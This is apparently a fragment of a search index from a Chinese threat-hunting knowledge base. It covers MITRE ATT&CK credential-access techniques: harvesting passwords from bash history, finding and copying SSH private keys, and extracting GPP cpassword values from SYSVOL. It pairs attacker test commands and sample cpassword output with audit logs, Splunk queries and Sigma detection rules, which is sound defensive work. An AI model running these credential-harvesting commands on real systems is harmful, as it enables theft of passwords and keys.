syscall=257 key=bash_history_110 \u200b condition: keywords ---------------------------------------------------------------------------------------- logsource: \u200b product: linux \u200b service: history detection: \u200b selection: \u200b keywords: \u200b - cat bash_history \u200b condition: keywords level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1552-003 https://attack.mitre.org/techniques/T1552/003/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html","title":"T1552-003-linux-Bash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#t1552-003-linux-bash","text":"","title":"T1552-003-linux-Bash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#attck","text":"Bash\u4f7f\u7528\u201chistory\u201d\u5b9e\u7528\u7a0b\u5e8f\u8ddf\u8e2a\u7528\u6237\u5728\u547d\u4ee4\u884c\u4e0a\u952e\u5165\u7684\u547d\u4ee4\u3002\u7528\u6237\u6ce8\u9500\u540e\uff0c\u4f1a\u5c06\u5386\u53f2\u8bb0\u5f55\u5237\u65b0\u5230\u7528\u6237\u7684 .bash_history \u6587\u4ef6\u4e2d\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u7528\u6237\uff0c\u6b64\u6587\u4ef6\u4f4d\u4e8e\u540c\u4e00\u4f4d\u7f6e\uff1a ~/.bash_history \u3002\u901a\u5e38\uff0c\u6b64\u6587\u4ef6\u4f1a\u8ddf\u8e2a\u7528\u6237\u7684\u6700\u8fd1500\u4e2a\u547d\u4ee4\u3002\u7528\u6237\u901a\u5e38\u5728\u547d\u4ee4\u884c\u4e0a\u952e\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u4f5c\u4e3a\u7a0b\u5e8f\u7684\u53c2\u6570\uff0c\u7136\u540e\u5728\u6ce8\u9500\u65f6\u5c06\u5176\u4fdd\u5b58\u5230\u6b64\u6587\u4ef6\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u6b64\u529f\u80fd\u6765\u67e5\u770b\u6587\u4ef6\u6765\u67e5\u770b\u6f5c\u5728\u51ed\u636e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_1","text":"cat #{bash\u5386\u53f2\u547d\u4ee4\u540d\u5b57} | grep #{bash\u5386\u53f2\u547d\u4ee4\u5173\u952e\u8bcd\u68c0\u7d22} > #{\u8f93\u51fa\u6587\u4ef6\u540d} sudo cat ~/.bash_history | grep password > bash.txt","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_3","text":"icbc@icbc:/$ sudo cat ~/.bash_history | grep password > bash.txt","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#audit","text":"icbc@icbc:/$ sudo cat ~/.bash_history | grep password > bash.txt type=PATH msg=audit(1563528127.048:1097): item=0 name=\"/usr/bin/cat\" inode=2228383 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 type=PATH msg=audit(1563528127.048:1097): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2237074 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 type=PROCTITLE msg=audit(1563528127.048:1097): proctitle=636174002F726F6F742F2E626173685F686973746F7279 type=SYSCALL msg=audit(1563528127.056:1099): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd4ebbb73b a2=0 a3=0 items=1 ppid=5249 pid=5258 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"cat\" exe=\"/usr/bin/cat\" key=\"bash_history_110\" type=CWD msg=audit(1563528127.056:1099): cwd=\"/root\" \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002","title":"audit\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#bash","text":"icbc@icbc:/$ history 1 sudo cat ~/.bash_history | grep password > bash.txt","title":"bash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#splunk","text":"audit \u65e5\u5fd7 index=linux sourcetype=\"linux_audit\" syscall=257 key=bash_history_110 | table host,auid,syscall,syscall_name,exe \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219 sudo auditctl -w ~/.bash_history -k bash_history_110","title":"splunk\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#splunk_1","text":"bash \u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=bash_history cat bash_history | table _time,host,user_name,bash_command","title":"splunk\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#sigma","text":"title: \u653b\u51fb\u8005\u8bfb\u53d6linux\u4e0b~/.bash_history\u6587\u4ef6\uff0c\u67e5\u770b\u662f\u5426\u5305\u542b\u76f8\u5173\u51ed\u636e\u5bc6\u7801 description: Ubuntu18.04 references: https://github.com/12306Bro/Threat-hunting/blob/master/T1139-linux-Bash\u5386\u53f2\u8bb0\u5f55.md tags: T1552-003 status: experimental author: 12306Bro logsource: \u200b product: linux \u200b service: audit detection: \u200b keywords: \u200b - syscall=257 key=bash_history_110 \u200b condition: keywords ---------------------------------------------------------------------------------------- logsource: \u200b product: linux \u200b service: history detection: \u200b selection: \u200b keywords: \u200b - cat bash_history \u200b condition: keywords level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/#_7","text":"MITRE-ATT&CK-T1552-003 https://attack.mitre.org/techniques/T1552/003/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/","text":"T1552-004-linux-\u79c1\u94a5 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u88ab\u5165\u4fb5\u7684\u7cfb\u7edf\u4e0a\u6536\u96c6\u79c1\u94a5\uff0c\u7528\u4e8e\u5bf9SSH\u7b49\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff08\u66b4\u529b\u7834\u89e3\u7b49\uff09\uff0c\u6216\u8005\u7528\u4e8e\u89e3\u5bc6\u5176\u4ed6\u6536\u96c6\u7684\u6587\u4ef6\uff0c\u5982\u7535\u5b50\u90ae\u4ef6\u3002\u901a\u7528\u5bc6\u94a5\u548c\u8bc1\u4e66\u6587\u4ef6\u6269\u5c55\u540d\u5305\u62ec\uff1a.key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \uff1b\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u67e5\u770b\u5e38\u89c1\u7684\u5bc6\u94a5\u76ee\u5f55\uff0c\u4f8b\u5982\u57fa\u4e8elinux/unix\u7684\u7cfb\u7edf\u4e0b\u7684~/.ssh\u76ee\u5f55\u6216Windows \u4e0a\u7684SSH\u5bc6\u94a5C:\\Users(username).ssh\\\u3002 \u79c1\u94a5\u5e94\u8be5\u9700\u8981\u5bc6\u7801\u6765\u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u952e\u76d8\u8bb0\u5f55\u83b7\u53d6\u5bc6\u7801\u6216\u5c1d\u8bd5\u79bb\u7ebf\u7206\u7834\u8d26\u53f7\u5bc6\u7801\u3002 \u6d4b\u8bd5\u6848\u4f8b find / -type f ( -name \" .pem\" -o -name \" .pgp\" -o -name \" .gpg\" -o -name \" .ppk\" -o -name \" .p12\" -o -name \" .key\" -o -name \" .pfx\" -o -name \" .cer\" -o -name \" .p7b\" -o -name \" .asc\" -o -name \"authorized*\" ) \u67e5\u627e\u7528\u6237\u7684SSH\u79c1\u94a5\uff1afind / -name id_rsa OR find / -name id_dsa \u4f7f\u7528CP\u590d\u5236SSH\u79c1\u94a5\uff1afind / -name id_rsa -exec cp --parents {} #{output_folder} ; find / -name id_dsa -exec cp --parents {} #{output_folder} ; \u4f7f\u7528rsync\u590d\u5236SSH\u79c1\u94a5\uff1afind / -name id_rsa -exec rsync -R {} #{output_folder} ; find / -name id_dsa -exec rsync -R {} #{output_folder} ; \u68c0\u6d4b\u65e5\u5fd7 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/$ sudo find / -name id_rsa \u4e0d\u518d\u8fdb\u884c\u4e00\u4e00\u6d4b\u8bd5 \u6d4b\u8bd5\u7559\u75d5 icbc@icbc:/$ history 639 sudo find / -name id_rsa \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u653b\u51fb\u8005\u67e5\u627elinux\u4e0b\u79c1\u94a5\u6587\u4ef6 description: Ubuntu18.04 references: https://github.com/12306Bro/Threathunting/blob/master/T1145-linux-\u79c1\u94a5.md tags: T1552-004 status: experimental author: 12306Bro logsource: product: linux service: history detection: keywords: - sudo find / -name *.pgp - sudo find / -name *.pem - sudo find / -name *.ppk - sudo find / -name *.p12 - sudo find / -name *.key condition: keywords level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1552-004 https://attack.mitre.org/techniques/T1552/004/ linux\u4e0b\u7684rsync\u516d\u4e2a\u4f7f\u7528\u5b9e\u4f8b https://www.linuxprobe.com/how-linux-rsync.html","title":"T1552-004-linux-\u79c1\u94a5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#t1552-004-linux-","text":"","title":"T1552-004-linux-\u79c1\u94a5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u88ab\u5165\u4fb5\u7684\u7cfb\u7edf\u4e0a\u6536\u96c6\u79c1\u94a5\uff0c\u7528\u4e8e\u5bf9SSH\u7b49\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff08\u66b4\u529b\u7834\u89e3\u7b49\uff09\uff0c\u6216\u8005\u7528\u4e8e\u89e3\u5bc6\u5176\u4ed6\u6536\u96c6\u7684\u6587\u4ef6\uff0c\u5982\u7535\u5b50\u90ae\u4ef6\u3002\u901a\u7528\u5bc6\u94a5\u548c\u8bc1\u4e66\u6587\u4ef6\u6269\u5c55\u540d\u5305\u62ec\uff1a.key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \uff1b\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u67e5\u770b\u5e38\u89c1\u7684\u5bc6\u94a5\u76ee\u5f55\uff0c\u4f8b\u5982\u57fa\u4e8elinux/unix\u7684\u7cfb\u7edf\u4e0b\u7684~/.ssh\u76ee\u5f55\u6216Windows \u4e0a\u7684SSH\u5bc6\u94a5C:\\Users(username).ssh\\\u3002 \u79c1\u94a5\u5e94\u8be5\u9700\u8981\u5bc6\u7801\u6765\u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u952e\u76d8\u8bb0\u5f55\u83b7\u53d6\u5bc6\u7801\u6216\u5c1d\u8bd5\u79bb\u7ebf\u7206\u7834\u8d26\u53f7\u5bc6\u7801\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_1","text":"find / -type f ( -name \" .pem\" -o -name \" .pgp\" -o -name \" .gpg\" -o -name \" .ppk\" -o -name \" .p12\" -o -name \" .key\" -o -name \" .pfx\" -o -name \" .cer\" -o -name \" .p7b\" -o -name \" .asc\" -o -name \"authorized*\" ) \u67e5\u627e\u7528\u6237\u7684SSH\u79c1\u94a5\uff1afind / -name id_rsa OR find / -name id_dsa \u4f7f\u7528CP\u590d\u5236SSH\u79c1\u94a5\uff1afind / -name id_rsa -exec cp --parents {} #{output_folder} ; find / -name id_dsa -exec cp --parents {} #{output_folder} ; \u4f7f\u7528rsync\u590d\u5236SSH\u79c1\u94a5\uff1afind / -name id_rsa -exec rsync -R {} #{output_folder} ; find / -name id_dsa -exec rsync -R {} #{output_folder} ;","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_2","text":"bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_3","text":"icbc@icbc:/$ sudo find / -name id_rsa \u4e0d\u518d\u8fdb\u884c\u4e00\u4e00\u6d4b\u8bd5","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_4","text":"icbc@icbc:/$ history 639 sudo find / -name id_rsa","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#sigma","text":"title: \u653b\u51fb\u8005\u67e5\u627elinux\u4e0b\u79c1\u94a5\u6587\u4ef6 description: Ubuntu18.04 references: https://github.com/12306Bro/Threathunting/blob/master/T1145-linux-\u79c1\u94a5.md tags: T1552-004 status: experimental author: 12306Bro logsource: product: linux service: history detection: keywords: - sudo find / -name *.pgp - sudo find / -name *.pem - sudo find / -name *.ppk - sudo find / -name *.p12 - sudo find / -name *.key condition: keywords level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_7","text":"MITRE-ATT&CK-T1552-004 https://attack.mitre.org/techniques/T1552/004/ linux\u4e0b\u7684rsync\u516d\u4e2a\u4f7f\u7528\u5b9e\u4f8b https://www.linuxprobe.com/how-linux-rsync.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1552-006-windows-\u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5728\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09\u4e2d\u67e5\u627e\u4e0d\u5b89\u5168\u7684\u51ed\u636e\u3002GPP\u662f\u5141\u8bb8\u7ba1\u7406\u5458\u4f7f\u7528\u5d4c\u5165\u5f0f\u51ed\u636e\u521b\u5efa\u57df\u7b56\u7565\u7684\u5de5\u5177\u3002\u8fd9\u4e9b\u7b56\u7565\u5141\u8bb8\u7ba1\u7406\u5458\u8bbe\u7f6e\u672c\u5730\u5e10\u6237\u3002 \u8fd9\u4e9b\u7ec4\u7b56\u7565\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u4e0a\u7684SYSVOL\u4e2d\u3002\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u57df\u7528\u6237\u90fd\u53ef\u4ee5\u67e5\u770bSYSVOL\u5171\u4eab\u5e76\u89e3\u5bc6\u5bc6\u7801\uff08\u4f7f\u7528\u5df2\u516c\u5f00\u7684AES\u5bc6\u94a5\uff09\u3002 \u4ee5\u4e0b\u5de5\u5177\u548c\u811a\u672c\u53ef\u7528\u4e8e\u4ece\u7ec4\u7b56\u7565\u9996\u9009\u9879XML\u6587\u4ef6\u6536\u96c6\u548c\u89e3\u5bc6\u5bc6\u7801\u6587\u4ef6\uff1a Metasploit\u7684\u540e\u671f\u5f00\u53d1\u6a21\u5757: post/windows/gather/credentials/gpp Get-GPPPassword gpprefdecrypt.py \u5728SYSVOL\u5171\u4eab\u4e0a\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u679a\u4e3e\u6f5c\u5728\u7684GPP XML\u6587\u4ef6\uff1adir /s * .xml \u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09 \u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09\u662f\u5141\u8bb8\u7ba1\u7406\u5458\u4f7f\u7528\u5d4c\u5165\u5f0f\u51ed\u636e\u521b\u5efa\u57df\u7b56\u7565\u7684\u5de5\u5177\u3002\u9664\u5176\u4ed6\u5916\uff0c\u8fd9\u4e9b\u7b56\u7565\u5141\u8bb8\u7ba1\u7406\u5458\u8bbe\u7f6e\u672c\u5730\u5e10\u6237\u3002 \u8fd9\u4e9b\u7ec4\u7b56\u7565\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u4e0a\u7684SYSVOL\u4e2d\uff0c\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u57df\u7528\u6237\u90fd\u53ef\u4ee5\u67e5\u770bSYSVOL\u5171\u4eab\u5e76\u89e3\u5bc6\u5bc6\u7801 AES\u79c1\u94a5\u5df2\u5728\u7ebf\u6cc4\u9732 \u3002 SYSVOL \u662f\u5728\u57df\u4e2d\u5168\u57df\u5171\u4eab\u7684\uff0c\u6240\u6709\u8ba4\u8bc1\u57df\u7528\u6237\u90fd\u6709\u8bfb\u6743\u9650\u3002SYSVOL \u5305\u542b\u767b\u5f55\u811a\u672c\u3001\u7ec4\u7b56\u7565\u6570\u636e\uff0c\u4ee5\u53ca\u57df\u63a7\u9700\u8981\u8bbf\u95ee\u7684\u5176\u4ed6\u57df\u91cc\u9762\u7684\u6570\u636e\uff08SYSVOL \u4e2d\u7684\u6570\u636e\u81ea\u52a8\u88ab\u6240\u6709\u57df\u63a7\u6240\u5171\u4eab\uff09\u6240\u6709\u7684\u7ec4\u7b56\u7565\u90fd\u5b58\u50a8\u5728\u8fd9\u4e2a\u4f4d\u7f6e\uff1a \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\ \u6d4b\u8bd5\u6848\u4f8b \u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4e0d\u9700\u8981\u4efb\u4f55\u9ed1\u5ba2\u5de5\u5177\uff0c\u653b\u51fb\u8005\u9700\u8981\u6253\u5f00\u6587\u4ef6\u6d4f\u89c8\u7684\u7a97\u53e3\u5e76\u4e14\u5728\u67e5\u627e\u57df\u6587\u4ef6\u5171\u4eab\u76ee\u5f55\u4e2d\u7684 XML \u6587\u4ef6\u3002\u901a\u5e38\u8fd9\u4e9b\u6587\u4ef6\u4f1a\u5305\u542b\u51ed\u636e\uff1aroups.xml\u3001scheduledtasks.xml\u3001Services.xml\u3002 \u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237 (\u4efb\u4f55\u57df\u4e2d\u7528\u6237\u6216\u8005\u53d7\u4fe1\u4efb\u57df\u4e2d\u7684\u7528\u6237) \u90fd\u53ef\u4ee5\u67e5\u770b SYSVOL \u4e2d\u7684\u5305\u542b AES \u52a0\u5bc6\u5bc6\u7801\u7684 XML \u6587\u4ef6\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u6b64 XML \u6587\u4ef6\uff0c\u4f7f\u7528 AES \u79c1\u94a5\u6765\u89e3\u5bc6 GPP \u5bc6\u7801 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u548c\u811a\u672c\u4ece\u7ec4\u7b56\u7565\u9996\u9009\u9879XML\u6587\u4ef6\u4e2d\u6536\u96c6\u548c\u89e3\u5bc6\u5bc6\u7801\u6587\u4ef6\uff1a Get-GPPPassword gpprefdecrypt.py ...... \u6ce8\u610f\uff1a\u5728SYSVOL\u5171\u4eab\u4e0a\uff0c\u4ee5\u4e0b\u547d\u4ee4\u53ef\u7528\u4e8e\u679a\u4e3e\u6f5c\u5728\u7684XML\u6587\u4ef6dir / s * .xml findstr /S /I cpassword \\\\0day.org\\sysvol\\0day.org\\policies\\*.xml \u5bf9\u4e8e\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u5b8c\u6210\u7684\u8bbe\u7f6e\uff0c\u6570\u636e\u5b58\u50a8\u5728SYSVOL\u6587\u4ef6\u5939\u4e2d\u7684XML\u6587\u4ef6\u4e2d\u3002\u5bf9\u4e8e\u67d0\u4e9b\u8bbe\u7f6e\uff0c\u9700\u8981\u7528\u6237\u51ed\u636e\uff0c\u4f8b\u5982\uff1a \u6620\u5c04\u9a71\u52a8\u5668\uff08Drives.xml\uff09 \u521b\u5efa\u672c\u5730\u7528\u6237\uff08unattend.xml\uff09 \u6570\u636e\u6e90\uff08DataSources.xml\uff09 \u6253\u5370\u673a\u914d\u7f6e\uff08Printers.xml\uff09 \u521b\u5efa/\u66f4\u65b0\u670d\u52a1\uff08Services.xml\uff09 \u8ba1\u5212\u4efb\u52a1\uff08ScheduledTasks.xml\uff09 \u66f4\u6539\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801 \u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08Groups.xml\uff09 \u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57\u641c\u7d22\u5728SYSVOL\u6587\u4ef6\u5939\u4e2d\u641c\u7d22\u8fd9\u4e9bXML\u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528\u952e\u503c\u201c cpassword \u201d \u641c\u7d22XML\u6587\u4ef6\u4e2d\u7684\u5bc6\u7801\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u7ec4\u7b56\u7565\u9996\u9009\u9879\u5141\u8bb8\u7ba1\u7406\u5458\u5728Active Directory\u57df\u4e2d\u7684\u670d\u52a1\u5668\u548c\u5de5\u4f5c\u7ad9\u4e0a\u521b\u5efa\u548c\u7ba1\u7406\u672c\u5730\u5e10\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u627e\u5230\u5e76\u83b7\u53d6\u7531\u7ec4\u7b56\u7565\u9996\u9009\u9879\u7ba1\u7406\u7684\u7ba1\u7406\u5e10\u6237\u51ed\u636e\u7684\u52a0\u5bc6\u5bc6\u7801\uff0c\u7136\u540e\u4f7f\u7528Microsoft\u53d1\u5e03\u7684AES\u5bc6\u94a5\u5bf9\u5176\u8fdb\u884c\u89e3\u5bc6\u3002 \u4ee5\u4e0b\u662f\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\u7684\u6458\u8981\uff1a \u653b\u51fb\u8005\u5229\u7528PowerShell\u6216PowerSploit\u7684Get-GPPPassword\u547d\u4ee4\u7b49\u5176\u4ed6\u5de5\u5177\uff0c\u5728\u57df\u63a7\u5236\u5668\u7684SYSVOL\u5171\u4eab\u4e0a\u627e\u5230\u5305\u542bAES\u52a0\u5bc6\u7684\u672c\u5730\u5e10\u6237\u5bc6\u7801\u7684\u7ec4\u7b56\u7565XML\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u7ed3\u5408Microsoft\u53d1\u5e03\u7684AES\u5bc6\u94a5\uff0c\u5bf9\u5bc6\u7801\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ee5\u660e\u6587\u5f62\u5f0f\u663e\u793a\u7ba1\u7406\u5e10\u6237\u5bc6\u7801\u3002 \u7531\u4e8eSYSVOL\u5171\u4eab\u5bf9\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u5f00\u653e\uff0c\u56e0\u6b64\u7ec4\u7ec7\u5185\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8bfb\u53d6\u6b64\u5904\u5b58\u50a8\u7684\u6587\u4ef6\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u7528\u6237\u5e10\u6237\u90fd\u53ef\u4ee5\u67e5\u627e\u548c\u89e3\u5bc6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5e76\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u5458\u5e10\u6237\u7684\u7eaf\u6587\u672c\u5bc6\u7801\u3002 Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Windows\\system32>findstr /S /I cpassword \\\\0day.org\\sysvol\\0day.org\\policies\\ *.xml \\\\0day.org\\sysvol\\0day.org\\policies\\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\\Machi ne\\Preferences\\Groups\\Groups.xml:<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D 24D26}\"><User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"tester\" image =\"0\" changed=\"2019-05-20 06:34:56\" uid=\"{47664872-E0C4-4476-A963-9F34564042B1}\"> <Properties action=\"C\" fullName=\"\" description=\"\" cpassword=\"WzC8r0KH+edYsh0heQv AVwcNxtSvX1efu9MU+z5e37E\" changeLogon=\"0\" noChange=\"0\" neverExpires=\"1\" acctDisa bled=\"0\" userName=\"tester\"/></User> \\\\0day.org\\sysvol\\0day.org\\policies\\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\\Machi ne\\Preferences\\Groups\\Groups.xml: <User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9 BDE98BA1D1}\" name=\"klionsec\" image=\"0\" changed=\"2019-05-20 06:35:29\" uid=\"{FBA27 650-BF8A-4EA4-A308-91540384B7E2}\"><Properties action=\"C\" fullName=\"\" description =\"\" cpassword=\"tlKQrm9IwkVCQX65tWY+KZ1iBu7tbjQ/2vCOFU3Kkiw\" changeLogon=\"0\" noCh ange=\"0\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"klionsec\"/></User> \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 